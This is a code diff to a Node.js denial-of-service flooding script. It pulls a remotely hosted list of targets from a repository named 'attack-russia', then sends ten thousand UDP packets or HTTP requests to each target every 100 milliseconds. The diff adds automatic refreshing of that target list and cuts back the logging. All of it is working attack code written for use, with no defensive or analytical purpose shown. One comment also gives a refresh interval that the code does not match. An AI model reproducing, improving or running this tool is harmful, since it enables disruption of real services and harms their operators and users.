@@ -3,10 +3,14 @@ const request = require('request');
 const udp = require('dgram');
 //const net = require('net');
 
-const DEBUG = true;
+var DEBUG = true;
 const requestCount = 10000;
 const requestInterval = 100;
+// once in 30mins
+const intervalsUpdateLimit = 1 * 60 * 1000 / requestInterval;
 const targetUrl = "https://raw.githubusercontent.com/andriytkachiv/attack-russia/master/targets.json";
+var targets,
+    intervalsCount;
 
 // creating a client socket
 let udpClient = udp.createSocket({type: 'udp4', reuseAddr: true});
@@ -28,7 +32,7 @@ function sendUdp(ip, port){
         var msg = Buffer.from('ping' + Math.random(), 'utf8');
 
         udpClient.send(msg, 0, msg.length, port, ip, function(err){
-            console.log(msg.toString());
+            DEBUG && console.log(msg.toString());
             return err ? reject(err) : resolve();
         });
 
@@ -71,18 +75,33 @@ function sendHttp(url, port) {
     catch (e) { console.log(e); }
 }
 
-request(targetUrl, function(error, response, body) {
-    // get targets
-    let targets = JSON.parse(body);
+// update targets
+function updateTargets(callback) {
+    request(targetUrl, function(error, response, body) {
+        targets = JSON.parse(body);
+        intervalsCount = 0;
 
-    DEBUG && console.log(targets);
+        DEBUG && console.log('Targets updated!');
+        DEBUG && console.log(targets);
 
+        if (typeof  callback === 'function') {
+            callback();
+        }
+
+        DEBUG && console.log(targets);
+    });
+}
+
+updateTargets(function() {
     for (let item of targets) {
         setInterval(() => {
+            if (intervalsCount > intervalsUpdateLimit) {
+                updateTargets();
+            }
+
             for (let i = 1; i <= requestCount; i++) {
 
                 if (isTCP(item.type)) {
-
 
                 } else if (isUDP(item.type)) {
                     sendUdp(item.url, item.port);
@@ -90,6 +109,8 @@ request(targetUrl, function(error, response, body) {
                     sendHttp(item.url, item.port);
                 }
             }
+            intervalsCount++;
         }, requestInterval);
     }
 });
+
